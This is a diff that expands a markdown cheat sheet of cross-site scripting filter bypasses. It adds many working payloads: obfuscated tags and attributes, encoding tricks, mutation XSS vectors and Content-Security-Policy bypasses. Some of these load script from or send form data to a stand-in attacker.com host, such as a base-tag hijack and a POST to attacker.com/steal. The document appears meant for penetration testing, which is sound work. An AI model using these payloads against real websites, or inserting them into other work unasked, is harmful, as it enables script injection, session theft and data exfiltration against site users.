@@ -11,6 +11,8 @@ Before trying random bypasses:
 3. Test encoding acceptance
 4. Check if filter is server-side or client-side
 
+---
+
 ## Character Filters
 
 ### `<>` Blocked
@@ -49,6 +51,8 @@ alert`1`
 setTimeout`alert\x281\x29`
 location='javascript:alert\x281\x29'
 onerror=alert;throw 1
+window.onerror=alert;throw 1
+eval.call`${'alert(1)'}`
 ```
 
 ### Spaces Blocked
@@ -66,6 +70,15 @@ Use tabs or newlines:
 onload=alert(1)>
 ```
 
+### Without Quotes
+
+```html
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+```
+
+---
+
 ## Keyword Filters
 
 ### `script` Blocked
@@ -82,6 +95,7 @@ onload=alert(1)>
 <iframe onload=alert(1)>
 <object data=javascript:alert(1)>
 <embed src=javascript:alert(1)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
 ```
 
 ### `alert` Blocked
@@ -94,6 +108,7 @@ eval('ale'+'rt(1)')
 window['ale'+'rt'](1)
 this['ale'+'rt'](1)
 []['constructor']['constructor']('alert(1)')()
+top['al'+'ert'](1)
 ```
 
 ### `on*` Events Blocked
@@ -112,6 +127,8 @@ Or different context:
 <a href=javascript:alert(1)>click</a>
 <form action=javascript:alert(1)><button>submit</button></form>
 ```
+
+---
 
 ## Encoding Bypasses
 
@@ -138,6 +155,7 @@ Or different context:
 
 ```javascript
 \u0061\u006c\u0065\u0072\u0074(1)  // alert(1)
+<script>\u0061lert(1)</script>
 ```
 
 ### Hex Escapes (in JS)
@@ -150,9 +168,14 @@ Or different context:
 
 ```html
 <img src=x onerror="\u0061lert(1)">
+<img src=x onerror=\u0061l\u0065rt(1)>
 ```
 
-## Case Manipulation
+---
+
+## Tag/Attribute Obfuscation
+
+### Case Manipulation
 
 ```html
 <ScRiPt>alert(1)</sCriPt>
@@ -160,13 +183,33 @@ Or different context:
 <iMg SrC=x OnErRoR=alert(1)>
 ```
 
-## Null Bytes / Comments
+### Tag Obfuscation
+
+```html
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script/src=data:,alert(1)>
+<script	>alert(1)</script>  <!-- Tab -->
+```
+
+### Attribute Obfuscation
+
+```html
+<img src=x onerror=alert(1)>
+<img src=x onerror='alert(1)'>
+<img src=x onerror="alert(1)">
+<img src=x onerror=alert`1`>
+<img/src=x/onerror=alert(1)>
+```
+
+### Null Bytes / Comments
 
 ```html
 <scr%00ipt>alert(1)</script>
 <script>al/**/ert(1)</script>
 <script>alert(1/**/)</script>
 ```
+
+---
 
 ## CSP Bypasses
 
@@ -184,9 +227,12 @@ Look at `Content-Security-Policy` header. Common weaknesses:
 
 ```javascript
 eval('alert(1)')
+setTimeout('alert(1)', 0)
+setInterval('alert(1)', 1000)
+Function('alert(1)')()
 ```
 
-### Whitelisted CDN
+### Whitelisted CDN with Vulnerable Libraries
 
 If `*.googleapis.com` or similar CDN allowed:
 
@@ -199,18 +245,87 @@ If `*.googleapis.com` or similar CDN allowed:
 
 ```html
 <script src="https://allowed-domain.com/api?callback=alert(1)//"></script>
+
+<!-- Google accounts JSONP bypass -->
+<script src="https://accounts.google.com/o/oauth2/postmessageRelay?parent=https://attacker.com&jsh=m;/alert(1)//"></script>
 ```
 
-### Base Tag Injection
+### Base Tag Injection (no `base-uri`)
 
 ```html
 <base href="https://attacker.com/">
 <script src="/malicious.js"></script>
+<!-- Now loads from attacker.com -->
 ```
 
-### Missing `script-src`
+### Missing `object-src`
 
-CSP without `script-src` falls back to `default-src`. If `default-src` allows something useful, exploit it.
+```html
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+```
+
+### Missing `form-action`
+
+```html
+<form action="https://attacker.com/steal" method="POST">
+<input name="data" value="secret">
+<button>Submit</button>
+</form>
+```
+
+### Data/Blob URIs Allowed
+
+```html
+<script src="data:text/javascript,alert(1)"></script>
+<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
+```
+
+### Nonce Bypass
+
+```html
+<!-- If nonce is static or predictable -->
+<script nonce="predictable123">alert(1)</script>
+
+<!-- Base tag + nonce (script with relative src) -->
+<base href="https://attacker.com/">
+<!-- <script nonce="xxx" src="/app.js"> now loads attacker's script -->
+```
+
+### Strict-Dynamic Bypass
+
+If page has script that creates scripts:
+
+```html
+<script nonce="xxx">
+  var s = document.createElement('script');
+  s.src = userInput;  // User controls this
+  document.body.appendChild(s);
+</script>
+```
+
+### CSP Quick Reference
+
+| CSP Weakness | Attack Vector |
+|--------------|---------------|
+| No CSP | Full XSS |
+| `unsafe-inline` | Inline scripts |
+| `unsafe-eval` | eval-based payloads |
+| `data:` allowed | data:text/javascript |
+| `*.googleapis.com` | JSONP callback |
+| `cdnjs.cloudflare.com` | Vulnerable libs |
+| Missing `object-src` | `<object>` tags |
+| Missing `base-uri` | `<base>` hijack |
+| Missing `form-action` | Form exfil |
+| Static nonce | Nonce reuse |
+
+### CSP Testing Tool
+
+```
+https://csp-evaluator.withgoogle.com/
+```
+
+---
 
 ## WAF-Specific
 
@@ -242,6 +357,8 @@ CSP without `script-src` falls back to `default-src`. If `default-src` allows so
 <svg/onload=alert(String.fromCharCode(88,83,83))>
 ```
 
+---
+
 ## Advanced Techniques
 
 ### Mutation XSS (mXSS)
@@ -251,6 +368,7 @@ Browser parsing quirks:
 ```html
 <listing>&lt;img src=x onerror=alert(1)&gt;</listing>
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
 ```
 
 ### Prototype Pollution to XSS
